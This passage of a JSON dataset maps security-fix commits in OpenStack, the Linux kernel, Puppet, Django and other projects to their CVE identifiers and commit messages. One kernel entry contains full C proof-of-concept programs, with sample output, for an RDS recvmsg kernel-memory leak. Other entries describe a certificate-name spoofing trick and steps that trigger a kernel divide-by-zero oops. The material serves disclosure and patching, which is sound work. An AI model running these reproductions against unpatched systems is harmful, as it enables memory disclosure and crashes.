    "body": "Fixes bug #998185This commit causes the token expiry time to be maintained whenone token is being created from anotherChange-Id: I7b61692a60d9227423b93c267864a5abe939ca33",
    "cveIds": [
      "CVE-2012-3426"
    ],
    "cveIdsCount": 1
  },
  "9a63babe094b47977464a05ea34e120f4fd88e6ca0ab349b774e5606dc252008": {
    "url": "http://github.com/openstack/keystone/commit/d9600434da14976463a0bd03abd8e0309f0db454",
    "title": "Invalidate user tokens when a user is disabled",
    "body": "Fixes Bug 997194Delete valid tokens for a user when they have been disabledMoved logic to delete tokens into update_user, as this can be calleddirectly form the REST API.Also checks if a user is enabled when creating a token from anothertoken, this helps in cases there the backend didn't support listing oftokens (and as a result weren't deleted)Change-Id: Ib5ed73a7873bfa66ef31bf6d0f0322f50e677688",
    "cveIds": [
      "CVE-2012-3426"
    ],
    "cveIdsCount": 1
  },
  "4471f647f27c9740186128884bf7c9e592fa9f2227adffd8ec2e4efc4d05f549": {
    "url": "http://github.com/openstack/keystone/commit/29e74e73a6e51cffc0371b32354558391826a4aa",
    "title": "Carrying over token expiry time when token chaining",
    "body": "Fixes bug #998185This commit causes the token expiry time to be maintained whenone token is being created from anotherChange-Id: I7b61692a60d9227423b93c267864a5abe939ca33",
    "cveIds": [
      "CVE-2012-3426"
    ],
    "cveIdsCount": 1
  },
  "45ad9030ff5f3a11f51438af939f4fd3ac8fc83430d1859766961f1e9037a5f0": {
    "url": "http://github.com/openstack/keystone/commit/a67b24878a6156eab17b9098fa649f0279256f5d",
    "title": "Invalidate user tokens when password is changed",
    "body": "Fixes bug 996595This commit will cause all valid tokens to be deleted for a userwho's password is changed (implemented for the sql and kvs backends)Change-Id: I6ad7da8957b7041983a3fc91d9ba9368667d06ac",
    "cveIds": [
      "CVE-2012-3426"
    ],
    "cveIdsCount": 1
  },
  "f16ea316b60305d99d636035efb02ec4b4952342dea30a1c254841c267ae48fe": {
    "url": "https://github.com/torvalds/linux/commit/06b6a1cf6e776426766298d055bb3991957d90a7",
    "title": "rds: set correct msg_namelen",
    "body": "Jay Fenlason (fenlason@redhat.com) found a bug,that recvfrom() on an RDS socket can return the contents of random kernelmemory to userspace if it was called with a address length larger thansizeof(struct sockaddr_in).rds_recvmsg() also fails to set the addr_len paramater properly beforereturning, but that's just a bug.There are also a number of cases wher recvfrom() can return an entirely bogusaddress. Anything in rds_recvmsg() that returns a non-negative value but doesnot go through the \"sin = (struct sockaddr_in *)msg->msg_name;\" code pathat the end of the while(1) loop will return up to 128 bytes of kernel memoryto userspace.And I write two test programs to reproduce this bug, you will see that inrds_server, fromAddr will be overwritten and the following sock_fd will bedestroyed.Yes, it is the programmer's fault to set msg_namelen incorrectly, but it isbetter to make the kernel copy the real length of address to user space insuch case.How to run the test programs ?I test them on 32bit x86 system, 3.5.0-rc7.1 compilegcc -o rds_client rds_client.cgcc -o rds_server rds_server.c2 run ./rds_server on one console3 run ./rds_client on another console4 you will see something like:server is waiting to receive data...old socket fd=3server received data from client:data from clientmsg.msg_namelen=32new socket fd=-1067277685sendmsg(): Bad file descriptor/***************** rds_client.c ********************/int main(void){int sock_fd;struct sockaddr_in serverAddr;struct sockaddr_in toAddr;char recvBuffer[128] = \"data from client\";struct msghdr msg;struct iovec iov;sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);if (sock_fd < 0) {perror(\"create socket error\\n\");exit(1);}memset(&serverAddr, 0, sizeof(serverAddr));serverAddr.sin_family = AF_INET;serverAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");serverAddr.sin_port = htons(4001);if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {perror(\"bind() error\\n\");close(sock_fd);exit(1);}memset(&toAddr, 0, sizeof(toAddr));toAddr.sin_family = AF_INET;toAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");toAddr.sin_port = htons(4000);msg.msg_name = &toAddr;msg.msg_namelen = sizeof(toAddr);msg.msg_iov = &iov;msg.msg_iovlen = 1;msg.msg_iov->iov_base = recvBuffer;msg.msg_iov->iov_len = strlen(recvBuffer) + 1;msg.msg_control = 0;msg.msg_controllen = 0;msg.msg_flags = 0;if (sendmsg(sock_fd, &msg, 0) == -1) {perror(\"sendto() error\\n\");close(sock_fd);exit(1);}printf(\"client send data:%s\\n\", recvBuffer);memset(recvBuffer, '\\0', 128);msg.msg_name = &toAddr;msg.msg_namelen = sizeof(toAddr);msg.msg_iov = &iov;msg.msg_iovlen = 1;msg.msg_iov->iov_base = recvBuffer;msg.msg_iov->iov_len = 128;msg.msg_control = 0;msg.msg_controllen = 0;msg.msg_flags = 0;if (recvmsg(sock_fd, &msg, 0) == -1) {perror(\"recvmsg() error\\n\");close(sock_fd);exit(1);}printf(\"receive data from server:%s\\n\", recvBuffer);close(sock_fd);return 0;}/***************** rds_server.c ********************/int main(void){struct sockaddr_in fromAddr;int sock_fd;struct sockaddr_in serverAddr;unsigned int addrLen;char recvBuffer[128];struct msghdr msg;struct iovec iov;sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);if(sock_fd < 0) {perror(\"create socket error\\n\");exit(0);}memset(&serverAddr, 0, sizeof(serverAddr));serverAddr.sin_family = AF_INET;serverAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");serverAddr.sin_port = htons(4000);if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {perror(\"bind error\\n\");close(sock_fd);exit(1);}printf(\"server is waiting to receive data...\\n\");msg.msg_name = &fromAddr;/* * I add 16 to sizeof(fromAddr), ie 32, * and pay attention to the definition of fromAddr, * recvmsg() will overwrite sock_fd, * since kernel will copy 32 bytes to userspace. * * If you just use sizeof(fromAddr), it works fine. * */msg.msg_namelen = sizeof(fromAddr) + 16;/* msg.msg_namelen = sizeof(fromAddr); */msg.msg_iov = &iov;msg.msg_iovlen = 1;msg.msg_iov->iov_base = recvBuffer;msg.msg_iov->iov_len = 128;msg.msg_control = 0;msg.msg_controllen = 0;msg.msg_flags = 0;while (1) {printf(\"old socket fd=%d\\n\", sock_fd);if (recvmsg(sock_fd, &msg, 0) == -1) {perror(\"recvmsg() error\\n\");close(sock_fd);exit(1);}printf(\"server received data from client:%s\\n\", recvBuffer);printf(\"msg.msg_namelen=%d\\n\", msg.msg_namelen);printf(\"new socket fd=%d\\n\", sock_fd);strcat(recvBuffer, \"--data from server\");if (sendmsg(sock_fd, &msg, 0) == -1) {perror(\"sendmsg()\\n\");close(sock_fd);exit(1);}}close(sock_fd);return 0;}Signed-off-by: Weiping Pan <wpan@redhat.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-3430"
    ],
    "cveIdsCount": 1
  },
  "42cbc6c3d92e42b4b58ae0cce39f9bbbc67e5e9704e4a75a0772238f84836325": {
    "url": "https://github.com/openstack/nova/commit/ce4b2e27be45a85b310237615c47eb53f37bb5f3",
    "title": "Prohibit file injection writing to host filesystem",
    "body": "This is a refinement of the previous fix in commit 2427d4a,which does the file name canonicalization as the root user.This is required so that guest images could not for example,protect malicious symlinks in a directory only readable by root.Fixes bug: 1031311, CVE-2012-3447Change-Id: I7f7cdeeffadebae7451e1e13f73f1313a7df9c5c",
    "cveIds": [
      "CVE-2012-3447"
    ],
    "cveIdsCount": 1
  },
  "3097a8b3190dac9be5a62f5259fbbeed0a8a04e0f66b9b6b735b36e5e6fadc3d": {
    "url": "https://github.com/openstack/nova/commit/d9577ce9f266166a297488445b5b0c93c1ddb368",
    "title": "Prohibit file injection writing to host filesystem",
    "body": "This is a refinement of the previous fix in commit 2427d4a,which does the file name canonicalization as the root user.This is required so that guest images could not for example,protect malicious symlinks in a directory only readable by root.Fixes bug: 1031311, CVE-2012-3447Change-Id: I7f7cdeeffadebae7451e1e13f73f1313a7df9c5c",
    "cveIds": [
      "CVE-2012-3447"
    ],
    "cveIdsCount": 1
  },
  "920eaf80d63ed2f1764e88a68d880cbc2c6acb8f49dc9915d0dd022a67023d47": {
    "url": "https://github.com/bbangert/beaker/commit/91becae76101cf87ce8cbfabe3af2622fc328fe5",
    "title": "Apply patch from Redhat to secure pycrypto that otherwise could allow…",
    "body": "… an attacker to determine contents of the encrypted payload (but is unable to modify).",
    "cveIds": [
      "CVE-2012-3458"
    ],
    "cveIdsCount": 1
  },
  "33e939e216067bfbe719500218ce1ec40410d2398675b52ace29d55f5932b800": {
    "url": "https://github.com/ushahidi/Ushahidi_Web/commit/68d9916",
    "title": "Fix SQLi in MY_Checkin_Api_Object.php #645",
    "body": "Parameterize query to check if user email exists",
    "cveIds": [
      "CVE-2012-3469"
    ],
    "cveIdsCount": 1
  },
  "a048b8fb0dd6288190c19dd1b76ec3b5811d93f18ef25211e8599c51c6418fc9": {
    "url": "https://github.com/ushahidi/Ushahidi_Web/commit/a11d43c",
    "title": "Fix SQLi in location api #654",
    "body": "* Removes Location_MOdel::get_locations since it better to use ORM* Filter locations by location_visible* Sanitize location id (automatic thanks to query builder/ORM)* Slight change to JSON response, but should be backwards compatible * Now returns lat/long/id as numbers not strings * Now return name and location_name * Response now includes location_date",
    "cveIds": [
      "CVE-2012-3469"
    ],
    "cveIdsCount": 1
  },
  "f01a88d2109283dfc065a9091323ba4974a9cc9ca358b0f91dc478fa23bc4113": {
    "url": "https://github.com/ushahidi/Ushahidi_Web/commit/3301e48",
    "title": "Fix SQLi in MY_Countries_Api_Object.php #645",
    "body": "Converted _get_countries function to use the ORM instead so queriesare sanitized automatically. This adds some extra fields to the responsebut existing fields are unchanged.",
    "cveIds": [
      "CVE-2012-3470"
    ],
    "cveIdsCount": 1
  },
  "76bdd4c818c9c0bb72066bca38c353c643b8c9ef35776cf7c2981c4640cd6a4a": {
    "url": "https://github.com/ushahidi/Ushahidi_Web/commit/3f14fa0",
    "title": "Fix SQLi in admin and members reports/edit controllers #645",
    "body": "* Previously the incident id was not sanitized before being used in the geometry query.",
    "cveIds": [
      "CVE-2012-3471"
    ],
    "cveIdsCount": 1
  },
  "e4a47e24554ef84c2c7f9b1d68a70cec66abca2c23e21fbeb7726fc5d5b10a8f": {
    "url": "https://github.com/ushahidi/Ushahidi_Web/commit/4c24325",
    "title": "Add authentication to the email API #665",
    "body": "* Also fixes undefined variable $ret_value error",
    "cveIds": [
      "CVE-2012-3472"
    ],
    "cveIdsCount": 1
  },
  "81538f3345d5c0bd18ce25891903cc178a8928b5fe593a4eadcc46d00f00cbab": {
    "url": "https://github.com/openstack/keystone/commit/c13d0ba606f7b2bdc609a7f388334e5efec3f3aa",
    "title": "Require authz to update user's tenant (bug 1040626)",
    "body": "Change-Id: I82f80b84af2bc4db00b3dcb87a2ec338816a82e9",
    "cveIds": [
      "CVE-2012-3542"
    ],
    "cveIdsCount": 1
  },
  "e3ebc0297205d5c30825eef20c616ea11204af8cde4011434cfdab28f0541601": {
    "url": "https://github.com/puppetlabs/puppet/commit/c3c7462e4066bf3a563987a402bf3ddf278bcd87",
    "title": "Add Selector terminus for file_content/file_metadata",
    "body": "This terminus is now the default, and encapsulates the behavior that waspreviously in the IndirectionHooks. That is, we dynamically select theterminus to use for a file request based on the key. However, for thepuppet master, we instead explicitly always use the FileServer terminus,so that *all* requests for files from the master will go throughthe file server. This ensures that we will never accidentallyserve local files on the puppet master.",
    "cveIds": [
      "CVE-2012-3864"
    ],
    "cveIdsCount": 1
  },
  "82a72f536c3e002f6c5dc99ece5f6989ff22b531c4014a22c889503f7ff92130": {
    "url": "https://github.com/puppetlabs/puppet/commit/10f6cb8969b4d5a933b333ecb01ce3696b1d57d4",
    "title": "Add Selector terminus for file_content/file_metadata",
    "body": "This terminus is now the default, and encapsulates the behavior that waspreviously in the IndirectionHooks. That is, we dynamically select theterminus to use for a file request based on the key. However, for thepuppet master, we instead explicitly always use the FileServer terminus,so that *all* requests for files from the master will go throughthe file server. This ensures that we will never accidentallyserve local files on the puppet master.",
    "cveIds": [
      "CVE-2012-3864"
    ],
    "cveIdsCount": 1
  },
  "d397cfdd624a0bdaab73e71335e46447a82e941b15a1ab30a45e160f83aa2132": {
    "url": "https://github.com/puppetlabs/puppet/commit/fd44bf5e6d0d360f6a493d663b653c121fa83c3f",
    "title": "Tighten permissions on classfile, resourcefile, lastrunfile, and last…",
    "body": "…runreport.",
    "cveIds": [
      "CVE-2012-3866"
    ],
    "cveIdsCount": 1
  },
  "0970410ee16de463752e3cad7f20185d88f0e489802fa8ba1014466e2acb9550": {
    "url": "https://github.com/puppetlabs/puppet/commit/dfedaa5fa841ccf335245a748b347b7c7c236640",
    "title": "Validate CSR CN and provided certname before signing",
    "body": "This adds a few new checks when signing CSRs, to validate the CN. First,it must conform to a small set of characters, which are the printableASCII characters, except for '/' (because we store these in files). Thisprevents attacks such as a CN \"foo^H^H^Hbar\", which appears as \"bar\" to\"puppet cert list\".The other check is that the certname for the SSL::Host that we thinkwe're signing must match the CN. This prevents a CSR with the CN \"foo\"from being submitted as a CSR for \"bar\", which would cause it to appearas \"bar\" to \"puppet cert list\", but to issue a certificate for \"foo\".",
    "cveIds": [
      "CVE-2012-3867"
    ],
    "cveIdsCount": 1
  },
  "4c66e6cf290a7b78e4c8d39e110f0386c4a876b8ae57cdb0cd1a9d6cc60fa0c7": {
    "url": "https://github.com/puppetlabs/puppet/commit/f3419620b42080dad3b0be14470b20a972f13c50",
    "title": "Validate CSR CN and provided certname before signing",
    "body": "This adds a few new checks when signing CSRs, to validate the CN. First,it must conform to a small set of characters, which are the printableASCII characters, except for '/' (because we store these in files). Thisprevents attacks such as a CN \"foo^H^H^Hbar\", which appears as \"bar\" to\"puppet cert list\".The other check is that the certname for the SSL::Host that we thinkwe're signing must match the CN. This prevents a CSR with the CN \"foo\"from being submitted as a CSR for \"bar\", which would cause it to appearas \"bar\" to \"puppet cert list\", but to issue a certificate for \"foo\".",
    "cveIds": [
      "CVE-2012-3867"
    ],
    "cveIdsCount": 1
  },
  "75e3db87685717b43c36a0ea1c4e714ca8bbf1918204c6e145639333f0dd843c": {
    "url": "https://github.com/openstack/swift/commit/e1ff51c04554d51616d2845f92ab726cb0e5831a",
    "title": "Do not use pickle for serialization in memcache, but JSON",
    "body": "We don't want to use pickle as it can execute arbitrary code. JSON issafer. However, note that it supports serialization for only somespecific subset of object types; this should be enough for what we need,though.To avoid issues on upgrades (unability to read pickled values, and cachepoisoning for old servers not understanding JSON), we add amemcache_serialization_support configuration option, with the followingvalues: 0 = older, insecure pickle serialization 1 = json serialization but pickles can still be read (still insecure) 2 = json serialization only (secure and the default)To avoid an instant full cache flush, existing installations shouldupgrade with 0, then set to 1 and reload, then after some time (24hours) set to 2 and reload. Support for 0 and 1 will be removed infuture versions.Part of bug 1006414.Change-Id: Id7d6d547b103b4f23ebf5be98b88f09ec6027ce4",
    "cveIds": [
      "CVE-2012-4406"
    ],
    "cveIdsCount": 1
  },
  "57de5f9c64ea85c3d27a0afa3b2e3d7ccbb16f53b40034afd4935f407dd8256a": {
    "url": "https://github.com/zendframework/zf2/commit/27131ca9520bdf1d4c774c71459eba32f2b10733",
    "title": "Merge branch 'security/escaper-usage'",
    "body": "Fixes a number of components that were not using Zend\\Escaper to escape HTML,HTML attributes, and/or URLs.",
    "cveIds": [
      "CVE-2012-4451"
    ],
    "cveIdsCount": 1
  },
  "07b327a037ff5706cf871925df6ec16ead56e9619e60291326827250e75fa758": {
    "url": "https://github.com/openstack/keystone/commit/868054992faa45d6f42d822bf1588cb88d7c9ccb",
    "title": "Require authz for user role list (bug 1006815)",
    "body": "Change-Id: I65f25dcca3e265f44746930917434b45e64de15e",
    "cveIds": [
      "CVE-2012-4456"
    ],
    "cveIdsCount": 1
  },
  "f22b0b52e5286f6f01da4c4f31c34382478df4deb7f4a294c7b135db8042eff0": {
    "url": "https://github.com/openstack/keystone/commit/14b136aed9d988f5a8f3e699bd4577c9b874d6c1",
    "title": "Require authz for user role list (bug 1006815)",
    "body": "Change-Id: I65f25dcca3e265f44746930917434b45e64de15e",
    "cveIds": [
      "CVE-2012-4456"
    ],
    "cveIdsCount": 1
  },
  "0dfac2b969a88c5f85c405e042cff00caf82dd878101b033153b4e24d8fbafbf": {
    "url": "https://github.com/openstack/keystone/commit/1d146f5c32e58a73a677d308370f147a3271c2cb",
    "title": "Require authz for service CRUD (bug 1006822)",
    "body": "Change-Id: Ia90f0aa2b856b9a9874d4865fb92ee913e8125c5",
    "cveIds": [
      "CVE-2012-4456"
    ],
    "cveIdsCount": 1
  },
  "5164850a52c78f4a6f00de80f11289871a17193ab5a12f2d77560f0aab8bf070": {
    "url": "https://github.com/openstack/keystone/commit/24df3adb3f50cbb5ada411bc67aba8a781e6a431",
    "title": "Require authz for service CRUD (bug 1006822)",
    "body": "Change-Id: Ia90f0aa2b856b9a9874d4865fb92ee913e8125c5",
    "cveIds": [
      "CVE-2012-4456"
    ],
    "cveIdsCount": 1
  },
  "9d55e23056d9e1992fd99676a4b0a9762ec6059d7ee5656db08e8ff9b3adcb1d": {
    "url": "https://github.com/openstack/keystone/commit/5373601bbdda10f879c08af1698852142b75f8d5",
    "title": "Raise unauthorized if tenant disabled (bug 988920)",
    "body": "If the client attempts to explicitly authenticate against a disabledtenant, keystone should return HTTP 401 Unauthorized.Change-Id: I49fe56b6ef8d9f2fc6b9357472dae8964bb9cb9c",
    "cveIds": [
      "CVE-2012-4457"
    ],
    "cveIdsCount": 1
  },
  "f340482994ad1c85b1fe412afeb4e90d4061c1e1383e2a0554b14ff99ead30df": {
    "url": "https://github.com/openstack/keystone/commit/4ebfdfaf23c6da8e3c182bf3ec2cb2b7132ef685",
    "title": "Raise unauthorized if tenant disabled (bug 988920)",
    "body": "If the client attempts to explicitly authenticate against a disabledtenant, keystone should return HTTP 401 Unauthorized.Change-Id: I49fe56b6ef8d9f2fc6b9357472dae8964bb9cb9c",
    "cveIds": [
      "CVE-2012-4457"
    ],
    "cveIdsCount": 1
  },
  "027cdd9037f8dee822e7d3f11d5ae94b785109b04f67ea0aedaba1f3fafb2e18": {
    "url": "https://github.com/torvalds/linux/commit/ed6fe9d614fc1bca95eb8c0ccd0e92db00ef9d5d",
    "title": "Fix order of arguments to compat_put_time[spec|val]",
    "body": "Commit 644595f (\"compat: Handle COMPAT_USE_64BIT_TIME innet/socket.c\") introduced a bug where the helper functions to takeeither a 64-bit or compat time[spec|val] got the arguments in the wrongorder, passing the kernel stack pointer off as a user pointer (and viceversa).Because of the user address range check, that in turn then causes anEFAULT due to the user pointer range checking failing for the kerneladdress. Incorrectly resuling in a failed system call for 32-bitprocesses with a 64-bit kernel.On odder architectures like HP-PA (with separate user/kernel addressspaces), it can be used read kernel memory.Signed-off-by: Mikulas Patocka <mpatocka@redhat.com>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2012-4467"
    ],
    "cveIdsCount": 1
  },
  "e8b171c9c64ea295d223d1fb3e35e23fc53574fea65f5b4244b7abcf9b85dd1b": {
    "url": "https://github.com/sitaramc/gitolite/commit/f636ce3ba3e340569b26d1e47b9d9b62dd8a3bf2",
    "title": "(security) fix bug in pattern to detect path traversal",
    "body": "while we're about it, add the same check to some of the internalroutines, so that commands can also be protected.finally, just to make sure we don't lose it again in some other fashion,add a few tests for path traversal...",
    "cveIds": [
      "CVE-2012-4506"
    ],
    "cveIdsCount": 1
  },
  "3a9299f3c3b8abac1ad0bb8bb2ccf273e92606644d204b46abb5dd5f34fd0545": {
    "url": "https://github.com/django/django/commit/9305c0e12d43c4df999c3301a1f0c742264a657e",
    "title": "Fixed a security issue related to password resets",
    "body": "Full disclosure and new release are forthcoming",
    "cveIds": [
      "CVE-2012-4520"
    ],
    "cveIdsCount": 1
  },
  "3dc8dccdb716e45b6214f71c3c5a5feb660b5ce1cab155244491431948202ec4": {
    "url": "https://github.com/django/django/commit/b45c377f8f488955e0c7069cad3f3dd21910b071",
    "title": "Fixed a security issue related to password resets",
    "body": "Full disclosure and new release are forthcomingbackport from master",
    "cveIds": [
      "CVE-2012-4520"
    ],
    "cveIdsCount": 1
  },
  "892bc61884ec9b35427f5d5f06eda00c6e53d8ae947569299232e9f859f4184d": {
    "url": "https://github.com/django/django/commit/92d3430f12171f16f566c9050c40feefb830a4a3",
    "title": "Fixed a security issue related to password resets",
    "body": "Full disclosure and new release are forthcomingbackport from master",
    "cveIds": [
      "CVE-2012-4520"
    ],
    "cveIdsCount": 1
  },
  "e8b8c9d8516b3487f2a58b9c0cd766c830e0d5a589aa0d109c74474a0532b93e": {
    "url": "https://github.com/torvalds/linux/commit/b66c5984017533316fd1951770302649baf1aa33",
    "title": "exec: do not leave bprm->interp on stack",
    "body": "If a series of scripts are executed, each triggering module loading viaunprintable bytes in the script header, kernel stack contents can leakinto the command line.Normally execution of binfmt_script and binfmt_misc happens recursively.However, when modules are enabled, and unprintable bytes exist in thebprm->buf, execution will restart after attempting to load matchingbinfmt modules. Unfortunately, the logic in binfmt_script andbinfmt_misc does not expect to get restarted. They leave bprm->interppointing to their local stack. This means on restart bprm->interp isleft pointing into unused stack memory which can then be copied into theuserspace argv areas.After additional study, it seems that both recursion and restart remainsthe desirable way to handle exec with scripts, misc, and modules. Assuch, we need to protect the changes to interp.This changes the logic to require allocation for any changes to thebprm->interp. To avoid adding a new kmalloc to every exec, the defaultvalue is left as-is. Only when passing through binfmt_script orbinfmt_misc does an allocation take place.For a proof of concept, see DoTest.sh from: http://www.halfdog.net/Security/2012/LinuxKernelBinfmtScriptStackDataDisclosure/Signed-off-by: Kees Cook <keescook@chromium.org>Cc: halfdog <me@halfdog.net>Cc: P J P <ppandit@redhat.com>Cc: Alexander Viro <viro@zeniv.linux.org.uk>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2012-4530"
    ],
    "cveIdsCount": 1
  },
  "d2e67599492e88fe61c170861903a3dddefa0e7c25f0622c29c3e86831e3b11f": {
    "url": "https://github.com/torvalds/linux/commit/8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664",
    "title": "net: fix divide by zero in tcp algorithm illinois",
    "body": "Reading TCP stats when using TCP Illinois congestion control algorithmcan cause a divide by zero kernel oops.The division by zero occur in tcp_illinois_info() at: do_div(t, ca->cnt_rtt);where ca->cnt_rtt can become zero (when rtt_reset is called)Steps to Reproduce: 1. Register tcp_illinois: # sysctl -w net.ipv4.tcp_congestion_control=illinois 2. Monitor internal TCP information via command \"ss -i\" # watch -d ss -i 3. Establish new TCP conn to machineEither it fails at the initial conn, or else it needs to waitfor a loss or a reset.This is only related to reading stats. The function avg_delay() alsoperforms the same divide, but is guarded with a (ca->cnt_rtt > 0) at itscalling point in update_params(). Thus, simply fix tcp_illinois_info().Function tcp_illinois_info() / get_info() is called withoutsocket lock. Thus, eliminate any race condition on ca->cnt_rttby using a local stack variable. Simply reuse info.tcpv_rttcnt,as its already set to ca->cnt_rtt.Function avg_delay() is not affected by this race condition, asits called with the socket lock.Cc: Petr Matousek <pmatouse@redhat.com>Signed-off-by: Jesper Dangaard Brouer <brouer@redhat.com>Acked-by: Eric Dumazet <edumazet@google.com>Acked-by: Stephen Hemminger <shemminger@vyatta.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-4565"
    ],
    "cveIdsCount": 1
  },
  "088705447d693e11abcea06b5a4ad0a5dd28c0362af237aace8aa593a2da594e": {
    "url": "https://github.com/openstack/glance/commit/90bcdc5a89e350a358cf320a03f5afe99795f6f6",
    "title": "Delete from store after registry delete.",
    "body": "Because we rely on the registry to determine authorization in the glancev1 api, we must attempt a registry delete before deleting an image fromthe image store.This patch includes the test for the bug, which was posted separatelyon the bug.Fixes bug 1065187.Change-Id: I1a06b7c7421524066c684539e2f3516c4ed2c475",
    "cveIds": [
      "CVE-2012-4573"
    ],
    "cveIdsCount": 1
  },
  "a26e2af2140292de4bab9bc542fe4c773f59af2950edff319d9ef46c8f4ee683": {
    "url": "https://github.com/openstack/glance/commit/efd7e75b1f419a52c7103c7840e24af8e5deb29d",
    "title": "Ensure image owned by user before delayed_deletion",
    "body": "Fixes bug 1065187.Change-Id: Icf2f117a094c712bad645ef5f297e9f7da994c84",
    "cveIds": [
      "CVE-2012-4573"
    ],
    "cveIdsCount": 1
  },
  "20d81a5261a4eaa860ad34eaff4669b5faa0e107c9f86c73a102d3dee2cee2b0": {
    "url": "https://github.com/openstack/glance/commit/6ab0992e5472ae3f9bef0d2ced41030655d9d2bc",
    "title": "Delete from store after registry delete.",
    "body": "Because we rely on the registry to determine authorization in the glancev1 api, we must attempt a registry delete before deleting an image fromthe image store.This patch includes the test for the bug, which was posted separatelyon the bug.Fixes bug 1065187.Change-Id: I1a06b7c7421524066c684539e2f3516c4ed2c475",
    "cveIds": [
      "CVE-2012-4573"
    ],
    "cveIdsCount": 1
  },
  "ed2c0adcdbf09c4e18eddaf3d186eb1cf7c4d3d62cf1f9c44f03a880343e7413": {
    "url": "https://github.com/roundcube/roundcubemail/commit/c086978f6a91eacb339fd2976202fca9dad2ef32",
    "title": "Fix XSS issue where plain signatures wasn't secured in HTML mode (#14…",
    "body": "…88613)",
    "cveIds": [
      "CVE-2012-4668"
    ],
    "cveIdsCount": 1
  },
  "032cce10322e090ee95b95491a02eec6894a35b4fba39cb4b99abae98b05a319": {
    "url": "https://github.com/silverstripe/sapphire/commit/0085876",
    "title": "BUGFIX Casting return values on text helper methods in StringField, T…",
    "body": "…ext, Varchar",
    "cveIds": [
      "CVE-2012-4968"
    ],
    "cveIdsCount": 1
  },
  "54e6e8f235b1ff4be0114e29eff0d1e310807430f8e689252bed7c91b56af5e7": {
    "url": "https://github.com/forkcms/forkcms/commit/03e8f5b53f193a87116b3875eec39769d5c07114",
    "title": "Merge pull request #247 from jelmersnoeck/xss-fix-ajax-search",
    "body": "XSS: Escape the input on ajax searches.",
    "cveIds": [
      "CVE-2012-5164"
    ],
    "cveIdsCount": 1
  },
  "f31ae8c0aa95bdda2e8df5aa81bad3eca4d403298dfaee95d85ef3ee2a4a308c": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/50edafc0884aa15d0a1aa178089ac6a1ad2eb18a",
    "title": "Load JSON rather than javascript from phpmyadmin.net",
    "body": "Conflicts:js/functions.jslibraries/Header.class.php",
    "cveIds": [
      "CVE-2012-5368"
    ],
    "cveIdsCount": 1
  },
  "381d0f098c676a20d388a169a12f995e4517edf99e94e8ed1b09f1132a5a2bd0": {
    "url": "https://github.com/torvalds/linux/commit/9c52057c698fb96f8f07e7a4bcf4801a092bda89",
    "title": "Btrfs: fix hash overflow handling",
    "body": "The handling for directory crc hash overflows was fairly obscure,split_leaf returns EOVERFLOW when we try to extend the item and that issupposed to bubble up to userland. For a while it did so, but along theway we added better handling of errors and forced the FS readonly if wehit IO errors during the directory insertion.Along the way, we started testing only for EEXIST and the EOVERFLOW casewas dropped. The end result is that we may force the FS readonly if wecatch a directory hash bucket overflow.This fixes a few problem spots. First I add tests for EOVERFLOW in theplaces where we can safely just return the error up the chain.btrfs_rename is harder though, because it tries to insert the newdirectory item only after it has already unlinked anything the renamewas going to overwrite. Rather than adding very complex logic, I addeda helper to test for the hash overflow case early while it is still safeto bail out.Snapshot and subvolume creation had a similar problem, so they are usingthe new helper now too.Signed-off-by: Chris Mason <chris.mason@fusionio.com>Reported-by: Pascal Junod <pascal@junod.info>",
    "cveIds": [
      "CVE-2012-5374",
      "CVE-2012-5375"
    ],
    "cveIdsCount": 2
  },
  "c789446364865bdee9a456bb17c1606fba07e278002c492e8e60b65b1fd41343": {
    "url": "https://github.com/openstack/glance/commit/fc0ee7623ec59c87ac6fc671e95a9798d6f2e2c3",
    "title": "Ensure authorization before deleting from store",
    "body": "This fixes bug 1076506.Change-Id: I3794c14fe523a9a27e943d73dd0248489d2b91f6",
    "cveIds": [
      "CVE-2012-5482"
    ],
    "cveIdsCount": 1
  },
  "90eb4cc331847c0aeb741c7a20e2acf55ab497245fef7170593550a57c102adc": {
    "url": "https://github.com/openstack/glance/commit/b591304b8980d8aca8fa6cda9ea1621aca000c88",
    "title": "Ensure authorization before deleting from store",
    "body": "This fixes bug 1076506.Change-Id: I3794c14fe523a9a27e943d73dd0248489d2b91f6",
    "cveIds": [
      "CVE-2012-5482"
    ],
    "cveIdsCount": 1
  },
  "d4f9e6dba7cc2a20d9012834bdc40a171813c2627daee42b15845701e2c9e16d": {
    "url": "https://github.com/openshift/origin-server/commit/32564a0839b1517d762afab2013c26c0959bac00",
    "title": "Fix for Bug 880699",
    "body": "restorer.php security patch",
    "cveIds": [
      "CVE-2012-5647"
    ],
    "cveIdsCount": 1
  },
  "5035f64a4724853ea9a58856fd5dfe9403a852b258a37bf1d10a5525a80f2df2": {
    "url": "https://github.com/owncloud/core/commit/b24c929cc0",
    "title": "Encode the URI properly",
    "body": "Backport of eafa9b2",
    "cveIds": [
      "CVE-2012-5666"
    ],
    "cveIdsCount": 1
  },
  "be29ad9fd4217c6da5f5249cce0b97193b22b3d357621d47b55ff5449aa0d375": {
    "url": "https://github.com/jsomara/katello/commit/65f1e42b7bda0f3410931c50598540d944d8bf0d",
    "title": "877387 - Candlepin CA certificate mode in RPM",
    "body": "File mode is set to 0644 when RPM is generated.",
    "cveIds": [
      "CVE-2012-6116"
    ],
    "cveIdsCount": 1
  },
  "be4a273ad5eeab2a4dc3ed86a8c35d11d874fdfeab2dd24d4150d8645bc04c4d": {
    "url": "https://github.com/candlepin/candlepin/commit/f4d93230e58b969c506b4c9778e04482a059b08c",
    "title": "835977: Re-enable manifest signature checking.",
